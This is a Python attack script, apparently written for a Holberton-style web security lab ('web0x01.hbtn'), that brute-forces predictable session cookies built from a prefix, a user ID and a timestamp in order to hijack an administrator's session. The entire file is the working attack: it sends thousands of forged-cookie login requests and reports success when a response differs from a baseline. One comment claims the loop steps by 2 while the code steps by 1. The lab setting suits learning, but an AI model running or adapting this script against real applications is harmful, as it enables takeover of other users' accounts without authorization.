import requests
import json
import sys

# --- CONFIGURATION (UPDATED FOR YOUR SESSION) ---

# 1. Prefix from your latest cookie
prefix = "a9215a54-bc22-4cf5-b61"

# 2. Your CURRENT Session ID (We will scan backwards from this)
your_current_id_int = 4810407

# 3. Your CURRENT Timestamp (We will scan backwards from this)
your_current_ts = 17693468037

target_url = "http://web0x01.hbtn/api/a1/hijack_session/login"
your_session = "INSERT_YOUR_VALID_SESSION_COOKIE_HERE"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Content-Type": "application/json",
}
login_data = json.dumps({"email": "test@test.com", "password": "test"})

# Establish Baseline
print("[*] Establishing baseline...")
baseline_cookies = {"hijack_session": f"{prefix}-9999999-0000000000", "session": your_session}
try:
    baseline = requests.post(target_url, data=login_data, cookies=baseline_cookies, headers=headers, timeout=5)
    baseline_len = len(baseline.text)
    print(f"[*] Baseline length: {baseline_len}")
except Exception as e:
    print(f"[-] Connection Error: {e}")
    sys.exit(1)

print("\n[*] STARTING 2D ATTACK (ID + TIMESTAMP)")
print(f"[*] Scanning IDs: {your_current_id_int-50} to {your_current_id_int}")
print(f"[*] Scanning Time: {your_current_ts-3000} to {your_current_ts}")

# --- THE CRITICAL FIX: LOOP BOTH ID AND TIME ---

# 1. Loop through IDs (Admin is likely one of the 50 people before you)
for test_id in range(your_current_id_int, your_current_id_int - 50, -1):
    
    # 2. Loop through Time (Admin logged in within the last 3000 ticks)
    # We step by 2 to speed it up, assuming some tolerance
    for ts in range(your_current_ts, your_current_ts - 3000, -1):
        
        cookie_value = f"{prefix}-{test_id}-{ts}"
        
        cookies = {
            "hijack_session": cookie_value,
            "session": your_session
        }
        
        try:
            # Short timeout to go fast
            r = requests.post(target_url, data=login_data, cookies=cookies, headers=headers, timeout=0.5)
            
            # Check for ANY difference from baseline
            if len(r.text) != baseline_len or "success" in r.text.lower():
                print(f"\n\n[!!!] JACKPOT! SESSION HIJACKED [!!!]")
                print(f"[+] ID: {test_id}")
                print(f"[+] Timestamp: {ts}")
                print(f"[+] Cookie: {cookie_value}")
                print(f"[+] Response: {r.text}")
                sys.exit(0) # Stop immediately on success
                
        except requests.exceptions.RequestException:
            pass # Ignore connection errors to keep speed up

    # Progress bar for IDs
    sys.stdout.write(f"\r[*] Finished scanning ID: {test_id}   ")
    sys.stdout.flush()

print("\n[-] Scan finished. If failed, increase the ID range (e.g., -100).")
